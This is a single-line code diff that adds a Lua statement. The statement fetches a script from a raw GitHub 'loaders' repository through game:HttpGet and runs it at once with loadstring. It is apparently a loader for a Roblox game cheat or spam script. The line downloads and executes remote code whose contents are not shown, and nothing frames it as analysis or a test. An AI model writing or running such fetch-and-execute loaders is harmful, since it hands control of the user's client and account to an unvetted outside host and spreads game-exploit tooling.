@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/1-2-player-grapple-cart-obby-spam4-f8kxvbungwtx03.lua"))()
